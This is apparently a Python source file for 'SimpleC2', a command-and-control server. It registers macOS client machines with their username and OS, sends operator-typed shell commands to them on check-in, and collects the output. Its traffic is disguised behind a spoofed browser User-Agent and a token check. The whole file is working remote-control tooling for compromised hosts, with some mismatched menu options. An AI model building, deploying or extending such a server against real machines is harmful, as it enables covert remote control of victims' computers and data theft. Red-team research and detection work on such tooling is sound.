from aiohttp import web
from datetime import datetime
import aioconsole
import asyncio






active_clients = {}  # {client_id: {"last_seen": timestamp, "commands": []}}
allowed_client = set()  # Set of allowed client IDs





print("\033[1;36m+=====================================================================+")
print("SimpleC2 Server")
print("01010011 01101001 01101101 01110000 01101100 01100101 01000011 00110010")
print("+=====================================================================+\033[0m")



def is_allowed(UID):
    for cid in allowed_client:
        if cid == UID:
            return True
    return False


async def CommandResult(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)

    if (UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") \
        and (length == 266) and (token[:12] == "Bearer valid"):
        
        data = await request.json()
        command = data.get("command")
        output = data.get("output")

        print("\n[+] Result received")
        print(f"    Command: {command}")
        print(f"    Output:\n{output}\n")

        return web.Response(text="OK")
    else:
        return web.HTTPNotFound()
    
    
    
    
async def RegisterClient(request):
    try:
        data = await request.json()
    except:
        return web.HTTPBadRequest(text="Invalid JSON")

    # Extract headers
    headers = request.headers
    UAgent = headers.get('User-Agent', '')
    token = str(headers.get('Authorization', ''))

    # Simple header/token validation
    if not (UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
            and len(token) == 266 and token.startswith("Bearer valid")):
        return web.HTTPForbidden(text="Unauthorized")
    
    

    # Extract client info from JSON
    client_id = data.get("client_id")
    os_info = data.get("os")
    username = data.get("username")
    fingerprint = data.get("fingerprint")  # optional

    if not client_id:
        return web.HTTPBadRequest(text="Missing client_id")

    # Store/update client info
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_clients[client_id] = {
        "os": os_info,
        "username": username,
        "fingerprint": fingerprint,
        "last_seen": now
    }

    print(f"[+] Client {client_id} registered at {now} | OS: {os_info} | User: {username}")
    return web.json_response({"status": "registered", "client_id": client_id})






async def InitCall(request):
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))
    length = len(token)
    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
        text = 'OK'
        return web.Response(text=text)
    else:
        return web.HTTPNotFound()
        
        
        
        
async def CheckIn(request):
    peername = request.transport.get_extra_info('peername')
    headers = request.headers
    UAgent = headers.get('User-Agent')
    token = str(headers.get('Authorization'))

    # Validate headers
    if not ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) "
                 "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") 
            and len(token) == 266 and token.startswith("Bearer valid")):
        return web.HTTPNotFound()

    command = input(f"\033[34m[Source: {peername}]>>>\033[0m ")

    if command.lower() == 'help':
        print("-" * 100)
        print("\033[33mHelp menu:\033[0m")
        print("Enter any valid Mac OS command or endpoint action.")
        print("Special commands:")
        print("  exit_now   -> stop session for this client")
        print("  help       -> show this help menu")
        print("-" * 100)
        return web.json_response([])

    elif command.lower() == 'exit_now':
        print(f"[*] Session with {peername} disconnected.")
        return        

    else:
        return web.json_response([command])







def allow_clients():
    if( not active_clients):
        print("[*] No active clients to allow.")
        return
    print("\n=== Allow Clients Menu ===")
    print("Enter client IDs to allow (comma-separated), or 'all' to allow all clients.")
    user_input = input("Client IDs: ").strip()
    if user_input.lower() == 'all':
        allowed_client.clear()
        allowed_client.update(active_clients.keys())
        print("[*] All clients are now allowed.")
    else:
        ids = [cid.strip() for cid in user_input.split(',')]
        for cid in ids:
            if cid in active_clients:
                allowed_client.add(cid)
                print(f"[*] Client {cid} is now allowed.")
            else:
                print(f"[!] Client ID {cid} not found among active clients.")






async def on_shutdown(app):
    print("[*] Server shutting down, releasing resources...")

def start_server():
    app = web.Application()
    
    # Define routes
    app.add_routes([
        web.get('/initializee/sequence/0', InitCall),
        web.post('/register', RegisterClient),
        web.get('/validate/status', CheckIn),
        web.post('/validatiion/result', CommandResult),
        
    ])

    # Add shutdown cleanup
    app.on_shutdown.append(on_shutdown)

    # Start server
    print("[*] Server starting at http://0.0.0.0:8080")
    web.run_app(app, host="0.0.0.0", port=8080)
    
    
    
    
def show_clients():
    if not active_clients:
        print("[*] No active clients.")
        return
    print("[*] Current active clients:")
    for client, last_seen in active_clients.items():
        print(f" - {client} (last check-in: {last_seen})")

def main_menu():
    print("\n=== SimpleC2 Server Menu ===")
    print("1. Start Server")
    print("2. Show Active Clients")
    print("3. Exit")
    choice = input("Select an option: ")
    return choice

def main():
    while True:
        choice = main_menu()
        if choice == "1":
            print("[*] Starting server...")
            start_server()
        elif choice == "2":
            show_clients()
        elif choice == "3":
            allow_clients()
        elif choice == "4":
            print("[*] Exiting...")
            break
        else:
            print("[!] Invalid option, try again.")
    

if __name__ == '__main__':
    main()